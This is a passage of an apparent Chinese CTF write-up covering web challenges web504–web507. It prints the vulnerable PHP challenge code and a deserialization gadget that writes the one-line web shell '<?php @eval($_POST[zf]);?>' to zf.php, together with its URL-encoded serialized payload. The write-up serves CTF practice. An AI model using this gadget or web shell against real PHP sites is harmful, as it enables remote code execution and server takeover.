<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413223842488.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413223842488"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413223917170.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413223917170"></p>

<pre><code class="php">db_format=img/ee6d68225691981a53cadf2f11b187a7.jpg&amp;pre=phar:///var/www/html/
</code></pre>
<p>记住使用phar:&#x2F;&#x2F;协议哦</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413224734911.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413224734911"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413224744176.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220413224744176"></p>

<h1 id="web504"><a href="#web504" class="headerlink" title="web504"></a>web504</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414104704841.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414104704841"></p>

<p>这里也是搜到一个模板php,但是这里读取不了源码了</p>
<p>我们查看一下抓个包试试</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105156834.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414105156834"></p>

<p>可以看到这里访问的index.sml文件.我们试试有没有文件遍历</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105404649.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414105404649"></p>

<p>可见查询失败</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105530888.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414105530888"></p>

<p>下载这里也是一样</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105605711.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414105605711"></p>

<p>新增模板呢</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105811237.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414105811237"></p>

<p>上传成功.我们试试.php文件</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105901789.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414105901789"></p>

<p>&#x2F;api&#x2F;admin_settings.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-16 15:50:14
 Last Modified by:   h1xa
 Last Modified time: 2021-03-16 16:26:31
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


session_start();

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
    foreach ($_POST as $key =&gt; $value) &#123;
        $config[$key]=$value;
    &#125;
    file_put_contents(__DIR__.&#39;/../config/settings&#39;, serialize($config));
    $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;
</code></pre>
<p>复习一个这个文件</p>
<pre><code class="php">&lt;?php

class dbLog&#123;
    public $sql;
    public $content =&#39;&lt;?php @eval($_POST[zf]);?&gt;&#39;;
    public $log =&quot;./zf.php&quot;;

    public function __destruct()&#123;
        file_put_contents($this-&gt;log, $this-&gt;content,FILE_APPEND);
    &#125;
&#125;

$final = new dbLog();
echo &#39;;user=&#39;.urlencode(serialize($final));
#;user=O%3A5%3A%22dbLog%22%3A3%3A%7Bs%3A3%3A%22sql%22%3BN%3Bs%3A7%3A%22content%22%3Bs%3A26%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bzf%5D%29%3B%3F%3E%22%3Bs%3A3%3A%22log%22%3Bs%3A8%3A%22.%2Fzf.php%22%3B%7D
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414112216286.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414112216286"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414112259433.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414112259433"></p>

<p>可见已经反序列化了</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414113103225.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414113103225"></p>

<h1 id="web505"><a href="#web505" class="headerlink" title="web505"></a>web505</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414121330746.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414121330746"></p>

<p>这次发现又多了一个文件查看</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414121359533.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414121359533"></p>

<p>发现可以看到源码.我们看下新加的文件</p>
<p>api&#x2F;admin_file_view.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-24 00:53:45
 Last Modified by:   h1xa
 Last Modified time: 2021-03-24 02:49:36
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


session_start();

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;

    extract($_POST);
    if($debug==1 &amp;&amp; preg_match(&#39;/^user/&#39;, file_get_contents($f)))&#123;
        include($f);
    &#125;else&#123;
        $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;file_get_contents(__DIR__.&#39;/../&#39;.$name));
    &#125;
    $ret[&#39;msg&#39;]=&#39;查看成功&#39;;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414122321538.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414122321538"></p>

<p>先传一个文件上去</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414123323733.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414123323733"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414123406853.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414123406853"></p>

<h1 id="web506"><a href="#web506" class="headerlink" title="web506"></a>web506</h1><p>api&#x2F;admin_file_view.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-24 00:53:45
 Last Modified by:   h1xa
 Last Modified time: 2021-03-24 02:49:36
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


session_start();

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;

    extract($_POST);
    $ext = substr($f, strlen($f)-3,3);
    if(preg_match(&#39;/php|sml|phar/i&#39;, $ext))&#123;
        $ret[&#39;msg&#39;]=&#39;请不要使用此功能&#39;;
        die(json_encode($ret));
    &#125;
    if($debug==1 &amp;&amp; preg_match(&#39;/^user/&#39;, file_get_contents($f)))&#123;
        include($f);
    &#125;else&#123;
        $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;file_get_contents(__DIR__.&#39;/../&#39;.$name));
    &#125;
    $ret[&#39;msg&#39;]=&#39;查看成功&#39;;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414124910368.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414124910368"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414125413444.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414125413444"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414125540070.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414125540070"></p>

<h1 id="web507"><a href="#web507" class="headerlink" title="web507"></a>web507</h1><p>api&#x2F;admin_file_view.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-24 00:53:45
 Last Modified by:   h1xa
 Last Modified time: 2021-03-24 02:49:36
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


session_start();

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;

    extract($_POST);
    $ext = substr($f, strlen($f)-3,3);
    if(preg_match(&#39;/php|sml|phar/i&#39;, $ext))&#123;
        $ret[&#39;msg&#39;]=&#39;请不要使用此功能&#39;;
        die(json_encode($ret));
    &#125;
    if($debug==1 &amp;&amp; preg_match(&#39;/^user/&#39;, file_get_contents($f)))&#123;
        include($f);
    &#125;else&#123;
        $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;file_get_contents(__DIR__.&#39;/../&#39;.$name));
    &#125;
    $ret[&#39;msg&#39;]=&#39;查看成功&#39;;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;

</code></pre>
<p>api&#x2F;admin_templates.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-19 18:49:54
 Last Modified by:   h1xa
 Last Modified time: 2021-03-24 00:33:25
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


session_start();
include(&#39;../render/db_class.php&#39;);
error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
$action=$_GET[&#39;action&#39;];
if(!isset($user))&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;
switch ($action) &#123;
    case &#39;list&#39;:
        $sql = &quot;select id,name,type,path,des from templates limit 0,10&quot;;
        $db=new db();
        $temps = $db-&gt;select_array($sql);
        if(count($temps)&gt;0)&#123;
            $ret[&#39;count&#39;]=count($temps);
            $ret[&#39;data&#39;]=$temps;
            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
        &#125;
        break;
    case &#39;update&#39;:
        extract($_POST);
        $row=json_decode($row);
        if(waf($row))&#123;
            break;
        &#125;
        $sql =&quot;update templates set name=&#39;&#123;$row-&gt;name&#125;&#39;,path=&#39;&#123;$row-&gt;path&#125;&#39;,type=&#39;&#123;$row-&gt;type&#125;&#39;,des=&#39;&#123;$row-&gt;des&#125;&#39; where id =&#123;$row-&gt;id&#125;&quot;;
        $db = new db();
        if($db-&gt;update_one($sql))&#123;
            $ret[&#39;msg&#39;]=&#39;实时更新成功&#39;;
        &#125;else&#123;
            $ret[&#39;msg&#39;]=&#39;实时更新失败&#39;;
        &#125;
        break;
    case &#39;getContents&#39;:
        extract($_POST);
        $template=json_decode($template);
        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $template-&gt;path))&#123;
            $ret[&#39;count&#39;]=1;
            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
            $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;htmlspecialchars(file_get_contents(__DIR__.&#39;/../templates/&#39;.$template-&gt;path)));
        &#125;
        break;
    case &#39;download&#39;:
        extract($_POST);
        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $path))&#123;
            header(&quot;Content-Type: application/octet-stream&quot;); 
            header(&#39;Content-Disposition:  attachment; filename=&quot;&#39; . $path. &#39;&quot;&#39;);
            echo file_get_contents(__DIR__.&#39;/../templates/&#39;.$path);
            exit();
        &#125;
        break;
    case &#39;upload&#39;:
        extract($_POST);
        if(!preg_match(&#39;/php|phar|ini|settings/i&#39;, $name))
        &#123;
            if(preg_match(&#39;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#39;, $content))&#123;
                $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
            &#125;else&#123;
                file_put_contents(__DIR__.&#39;/../templates/&#39;.$name, $content);
                $ret[&#39;msg&#39;]=&#39;文件上传成功&#39;;
            &#125;

        &#125;else&#123;
            $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
        &#125;
        break;
    default:
        # code...
        break;
&#125;

function waf($row)&#123;
    $ret = false;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $row-&gt;name))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $row-&gt;type))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $row-&gt;des))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $row-&gt;path))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#39;, $row-&gt;id))&#123;
        $ret=true;
    &#125;
    return $ret;
&#125;
die(json_encode($ret));

</code></pre>
<p>这次对文件上传进行了过滤</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130230633.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414130230633"></p>

<p>从这里传</p>
